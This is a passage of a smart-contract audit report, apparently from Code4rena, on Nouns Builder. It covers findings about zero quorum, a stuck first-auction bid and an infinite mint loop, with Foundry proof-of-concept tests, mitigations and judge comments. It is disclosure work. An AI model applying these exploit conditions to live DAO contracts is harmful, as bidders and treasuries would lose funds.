class=\"mtk12\">proposalId</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Queued</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A minimum quorum votes governance configuration that is at least 1 can be added. When <code>quorum()</code> returns 0 because the token supply is low, calling <code>propose</code> could set <code>proposal.quorumVotes</code> to the minimum quorum votes.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607#issuecomment-1252939738\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Because rounding is determined by a mixture of <code>totalSupply</code> and <code>quorumThresholdBps</code> I believe the finding cannot be of high severity.</p>\n<p>It is important to note that because totalSupply can be zero, especially if founders take no founder mint, the Governor contract may be griefed, for example by giving away allowances to setup for a future rug-pull.</p>\n<p>Because the finding can cause a loss, and the code doesn’t have specific ways to avoid that (e.g. minimum totalSupply) i believe Medium Severity to be appropriate</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607#issuecomment-1259925381\">tbtstl (Nouns Builder) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>I think we’re going to have to ACK this and move on – there’s no clear minimum token requirement we can set at the beginning of a DAO lifecycle that couldn’t be circumvented by the malicious user buying the first <em>n</em> tokens. </p>\n<p>Situations like this will have to be handled by the DAOs vetoer until a quorum is deemed high enough.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-highest-bid-in-first-auction-can-get-irretrievably-stuck-in-the-protocol\" style=\"position:relative;\"><a href=\"#m-02-highest-bid-in-first-auction-can-get-irretrievably-stuck-in-the-protocol\" aria-label=\"m 02 highest bid in first auction can get irretrievably stuck in the protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376\">[M-02] Highest bid in first auction can get irretrievably stuck in the protocol</a></h2>\n<p><em>Submitted by PwnPatrol, also found by davidbrai, MiloTruck, and pauliax</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254\">Auction.sol#L248-L254</a><br></p>\n<p>If the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.</p>\n<p>If the first auction in such a protocol is paused and unpaused, the check for <code>if (auction.tokenId == 0)</code> will pass and <code>_createAuction()</code> will automatically be called, minting the next token and starting a new auction based on token #1.</p>\n<p>The result is that <code>highestBid</code> and <code>highestBidder</code> are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.</p>\n<p>The following test confirms this finding:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_PauseAndUnpauseInFirstAuction</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xB1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xB2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Deploying with no founder pct...&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deployMockWithEmptyFounders</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Unpausing...&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bidder makes initial bid.&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createBid</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBid_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBidder_</span><span class=\"mtk1\">,,,) = </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Currently bidding for ID &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Highest Bid: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid_</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;. Bidder: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Contract Balance: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;--------&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Pausing and unpausing auction house...&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bidder makes new bid.&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createBid</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId2_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBid2_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBidder2_</span><span class=\"mtk1\">,,,) = </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Currently bidding for ID &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId2_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Highest Bid: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid2_</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;. Bidder: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder2_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Contract Balance: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the block in <code>unpause()</code> that transfers ownership and creates an auction if <code>auction.tokenId == 0</code> and trigger those actions manually in the deployment flow.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376#issuecomment-1257253787\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a specific set of circumstances, which can happen exclusively during the first auction:</p>\n<ul>\n<li>If the first auction has a paying user</li>\n<li>The id is 0 (not minted to owner)</li>\n<li>And it get’s paused</li>\n</ul>\n<p>Then on restart the highestBidder will lose their ETH as well as not receive the NFT.</p>\n<p>A more appropriate behaviour would be to force settle if a bid was there, or to handle token0 like any other.</p>\n<p>Because of the conditionality of the finding, Medium Severity is appropriate.</p>\n<p>Minting the first token to a founder or settling before unpausing will avoid this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-tokenmint-infinite-loop-if-the-founders-shares-sum-up-to-100\" style=\"position:relative;\"><a href=\"#m-03-tokenmint-infinite-loop-if-the-founders-shares-sum-up-to-100\" aria-label=\"m 03 tokenmint infinite loop if the founders shares sum up to 100 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347\">[M-03] <code>Token:mint</code>: infinite loop if the founders’ shares sum up to 100</a></h2>\n<p><em>Submitted by zzzitron, also found by 0xSmartContract, ChristianKuri, davidbrai, elad, ElKu, hansfriese, immeas, ladboy233, Lambda, MiloTruck, scaraven, tonisives, and volky</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179\">Token.sol#L179</a><br></p>\n<p>The Token as well as Auction cannot be used if the sum of <code>ownershipPct</code> is 100</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_poc_mintforever</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">createUsers</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">percents</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pct</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">2</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">otherUsers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">pct</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">end</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deployWithCustomFounders</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalFounders</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalFounderOwnership</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 